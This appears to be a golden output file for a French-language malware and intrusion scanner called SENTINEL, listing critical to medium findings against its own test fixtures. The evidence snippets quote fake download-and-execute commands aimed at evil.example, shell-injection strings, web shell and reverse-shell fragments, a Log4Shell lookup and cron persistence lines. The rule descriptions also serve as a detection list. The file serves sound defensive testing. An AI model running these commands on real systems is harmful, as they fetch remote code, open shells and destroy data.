@@ -1,0 +1,130 @@
+SENTINEL
+overall_severity: critical
+severity_counts: critical=12 high=20 medium=6 low=0
+integrity_counts: added=0 removed=0 modified=0 mode_changed=0
+
+findings:
+[high] SIG-0014 tests/fixtures/sig/.bashrc:1
+  Persistance shell dans .bashrc, .profile, .zshrc ou .bash_profile
+  evidence: wget
+[high] SIG-0013 tests/fixtures/sig/.htaccess:1
+  Directive .htaccess dangereuse (auto_prepend ou AddType PHP)
+  evidence: php_value auto_prepend_file
+[high] SIG-0013 tests/fixtures/sig/.htaccess:2
+  Directive .htaccess dangereuse (auto_prepend ou AddType PHP)
+  evidence: AddType application/x-httpd-php
+[high] SIG-0007 tests/fixtures/sig/authorized_keys:1
+  Clé SSH publique ajoutée dans authorized_keys
+  evidence: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyMaterialForSentinelTest
+[high] SIG-0007 tests/fixtures/sig/authorized_keys:2
+  Clé SSH publique ajoutée dans authorized_keys
+  evidence: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfakeKeyMaterialForSentinel
+[critical] SIG-0001 tests/fixtures/sig/bad_utf8.php:1
+  Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP
+  evidence: eval(base64_decode($_POST
+[high] SIG-0003 tests/fixtures/sig/crontab.txt:1
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: curl http://evil.example/a | sh
+[high] SIG-0003 tests/fixtures/sig/crontab.txt:2
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: wget -q -O- http://evil.example/b | bash
+[high] SIG-0006 tests/fixtures/sig/crontab.txt:1
+  Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)
+  evidence: @reboot
+[high] SIG-0006 tests/fixtures/sig/crontab.txt:2
+  Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)
+  evidence: */10 * * * * wget
+[high] SIG-0003 tests/fixtures/sig/download.sh:1
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: curl -fsSL http://evil.example/x | sh
+[high] SIG-0003 tests/fixtures/sig/download.sh:2
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: wget -qO- http://evil.example/x | bash
+[high] SIG-0003 tests/fixtures/sig/download.sh:3
+  Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)
+  evidence: python -c 'import urllib; exec(urllib.request.urlopen("http://evil.example/p").read())'
+[critical] SIG-0008 tests/fixtures/sig/ec_private.pem:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN EC PRIVATE KEY-----
+[high] SIG-0004 tests/fixtures/sig/encoded.txt:1
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: base64 -d | sh
+[high] SIG-0004 tests/fixtures/sig/encoded.txt:2
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: eval(atob(
+[high] SIG-0004 tests/fixtures/sig/encoded.txt:3
+  Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)
+  evidence: powershell -enc
+[medium] SIG-0010 tests/fixtures/sig/headers.txt:2
+  User-Agent d'outil d'attaque ou de client scripté
+  evidence: User-Agent: sqlmap/1.7
+[critical] SIG-0008 tests/fixtures/sig/id_rsa:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN RSA PRIVATE KEY-----
+[medium] SIG-0009 tests/fixtures/sig/inject.sh:1
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: $(curl http://evil.example/x)
+[medium] SIG-0009 tests/fixtures/sig/inject.sh:2
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: `wget http://evil.example/y`
+[medium] SIG-0009 tests/fixtures/sig/inject.sh:3
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: ;rm -rf
+[medium] SIG-0009 tests/fixtures/sig/inject.sh:4
+  Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)
+  evidence: && curl
+[critical] SIG-0012 tests/fixtures/sig/jndi.txt:1
+  Log4Shell : lookup ${jndi:
+  evidence: ${jndi:
+[medium] SIG-0016 tests/fixtures/sig/ld_preload.sh:1
+  LD_PRELOAD ou LD_LIBRARY_PATH pointant vers /tmp
+  evidence: LD_PRELOAD=/tmp/
+[high] SIG-0005 tests/fixtures/sig/miner.conf:1
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: stratum+tcp
+[high] SIG-0005 tests/fixtures/sig/miner.conf:2
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: xmrig
+[high] SIG-0005 tests/fixtures/sig/miner.conf:3
+  Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)
+  evidence: minerd
+[critical] SIG-0008 tests/fixtures/sig/openssh_key:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN OPENSSH PRIVATE KEY-----
+[high] SIG-0015 tests/fixtures/sig/passwd:1
+  Modification d'identités (passwd :0:0: ou sudoers NOPASSWD / ALL=(ALL))
+  evidence: :0:0:
+[critical] SIG-0008 tests/fixtures/sig/pkcs8.pem:1
+  Clé privée en clair (RSA, OpenSSH, EC ou PKCS#8)
+  evidence: -----BEGIN PRIVATE KEY-----
+[critical] SIG-0002 tests/fixtures/sig/reverse.sh:1
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: bash -i
+[critical] SIG-0002 tests/fixtures/sig/reverse.sh:2
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: nc -e
+[critical] SIG-0002 tests/fixtures/sig/reverse.sh:3
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: ncat
+[critical] SIG-0002 tests/fixtures/sig/reverse.sh:4
+  Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)
+  evidence: socat tcp-listen:4444,reuseaddr exec:
+[high] SIG-0015 tests/fixtures/sig/sudoers:1
+  Modification d'identités (passwd :0:0: ou sudoers NOPASSWD / ALL=(ALL))
+  evidence: ALL=(ALL)
+[critical] SIG-0011 tests/fixtures/sig/webshell.jsp:1
+  Web shell JSP/ASP (Runtime.exec, Execute ou eval request dans un bloc <% )
+  evidence: <% Runtime.getRuntime().exec(
+[critical] SIG-0001 tests/fixtures/sig/webshell.php:2
+  Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP
+  evidence: eval(base64_decode($_POST
+
+anomalies (top) : heuristique, non neuronal
+- high_entropy.txt score=68 — entropy=6.005198353727544, max_line_len=800, nonprintable_ratio=0.0, shell_metachar_ratio=0.0, avg_line_len=800.0
+
+integrity:
+added: (aucun)
+removed: (aucun)
+modified: (aucun)
+mode_changed: (aucun)
+
